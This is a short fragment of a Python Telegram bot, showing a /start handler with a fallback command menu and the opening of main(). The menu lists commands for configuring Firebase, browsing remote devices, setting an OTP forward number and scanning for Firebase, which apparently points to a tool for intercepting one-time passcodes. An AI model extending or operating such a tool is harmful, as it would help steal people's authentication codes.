...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        logger.info("✅ /start replied OK")
    except Exception as e:
        logger.error(f"❌ /start HTML failed: {e}")
        try:
            plain_msg = (
                f"⚡ {BOT_NAME} ⚡\n\n"
                f"Commands:\n"
                f"/setup - Configure Firebase\n"
                f"/devices - Browse devices\n"
                f"/search ID - Search device\n"
                f"/list - All device IDs\n"
                f"/setotp - Set forward number\n"
                f"/scan - Detect Firebase\n"
                f"/resetforward - Reset tracker\n"
                f"/status - Show config\n"
                f"/help - Help"
            )
            await update.message.reply_text(plain_msg)
            logger.info("✅ /start replied (plain)")
        except Exception as e2:
            logger.error(f"❌ /start plain failed: {e2}")
...
def main():
    ...
    # ✅ Delete webhook first (conflict avoid)
    try:
